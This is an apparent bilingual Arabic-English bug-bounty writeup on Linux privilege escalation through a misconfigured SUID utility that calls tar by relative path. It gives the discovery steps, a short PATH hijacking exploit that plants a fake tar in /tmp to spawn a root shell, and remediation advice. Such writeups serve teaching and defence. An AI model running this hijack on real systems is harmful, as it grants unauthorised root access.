ترقية صلاحيات لينكس عبر ملفات SUID

Linux Local Privilege Escalation via SUID Binaries

HIGH Bounty: $1,000

Overview / نظرة عامة

AR

ملفات SUID هي ملفات تنفيذية تعمل بصلاحيات مالكها الفعلي (غالباً root) بدلاً من المستخدم الحالي. يوضح هذا التقرير كيفية اكتشاف ملف SUID غير آمن واستغلاله لتخطي العزل والحصول على shell بصلاحيات كاملة.

EN

SUID binaries allow users to execute files with owner privileges. This writeup documents how identifying a misconfigured custom SUID utility led to local privilege escalation on a Linux target.

Exploitation Steps / خطوات الاستغلال

  1. البحث عن ملفات SUID النشطة على النظام باستخدام أمر find.
  2. تحديد ملف مخصص /usr/local/bin/backup-tool يعمل بصلاحيات root.
  3. لاحظ أن التطبيق يقوم باستدعاء أداة tar بدون مسار مطلق (Relative Path).
  4. استغلال ثغرة PATH Injection بإنشاء ملف tar مزيف في المجلد /tmp وإضافته لمتغير البيئة PATH.
  5. تشغيل البرنامج ليعمل ملف الـ tar المزيف بصلاحيات root ويمنحنا shell.

Exploit Commands / أوامر الاستغلال

PATH Hijacking Exploit / استغلال متغير البيئة 
cd /tmp
echo "/bin/sh" > tar
chmod +x tar
export PATH=/tmp:$PATH
/usr/local/bin/backup-tool

Remediation / التخفيف والحماية

AR

احرص على كتابة المسارات المطلقة (Absolute Paths) في الأوامر والسكربتات التي تعمل بصلاحيات root، وتجنب استخدام SUID للملفات والسكربتات المخصصة إذا لم يكن ذلك ضرورياً.

EN

Always define absolute paths (e.g. /bin/tar) in root scripts, and avoid setting SUID bits on custom utilities without rigorous auditing.
